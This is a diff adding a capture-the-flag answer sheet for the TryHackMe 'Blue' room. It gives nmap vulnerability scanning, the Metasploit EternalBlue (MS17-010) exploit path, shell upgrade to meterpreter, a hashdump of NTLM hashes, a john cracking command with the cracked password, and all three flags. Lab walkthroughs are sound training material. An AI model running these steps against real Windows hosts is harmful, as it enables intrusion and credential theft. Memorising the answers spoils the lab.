@@ -1,0 +1,67 @@
+#Task 1 Recon 
+- How many ports are open with a port number under 1000?
+hint: nmap -sC -sV -Pn -vv --script=vuln $IP
+3
+
+- What is this machine vulnerable to? (Answer in the form of: ms??-???, ex: ms08-067)
+ms17-010
+
+
+# Task 2 Gain Access 
+- Find the exploitation code we will run against the machine. What is the full path of the code? (Ex: exploit/........)
+hint: msf6>search ms17
+exploit/windows/smb/ms17_010_eternalblue
+
+- Show options and set the one required value. What is the name of this value? (All caps for submission)
+hint: mfs6>show options
+rhosts
+
+
+#Task 3 Escalate 
+- If you haven't already, background the previously gained shell (CTRL + Z). Research online how to convert a shell to meterpreter shell in metasploit. What is the name of the post module we will use? (Exact path, similar to the exploit we previously selected) 
+hint: msf6>search shell_to_meterpreter
+post/multi/manage/shell_to_meterpreter
+
+
+- Select this (use MODULE_PATH). Show options, what option are we required to change?
+SESSION
+
+
+#Task 4 Cracking 
+- Within our elevated meterpreter shell, run the command 'hashdump'. This will dump all of the passwords on the machine as long as we have the correct privileges to do so. What is the name of the non-default user? 
+hint: meterpreter>hashdump
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
+save file hashpass.txt
+jon
+
+
+- Copy this password hash to a file and research how to crack it. What is the cracked password?
+hint: john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt hashpass.txt
+alqfna22
+
+
+#Task 5 Find flags! 
+- Flag1? This flag can be found at the system root. 
+hint: meterpreter> cd c:/
+dir
+cat flag1.txt
+flag{access_the_machine}
+
+
+- Flag2? This flag can be found at the location where passwords are stored within Windows.
+hint: cat c:\Windows\System32\config\flag2.txt
+flag{sam_database_elevated_access}
+
+
+- flag3? This flag can be found in an excellent location to loot. After all, Administrators usually have pretty interesting things saved. 
+hint:meterpreter>cd c:/Users/Jon/Documents
+cat flag3.txt
+flag{admin_documents_can_be_valuable}
+
+https://tryhackme.com/room/blue
+https://ratiros01.medium.com/tryhackme-blue-dc8b97351248
+https://www.aldeid.com/wiki/TryHackMe-Blue
+https://medium.com/@CyberOPS.LittleDog/tryhackme-blue-4394d965c957
+https://unicornsec.com/home/tryhackme-blue-t6red
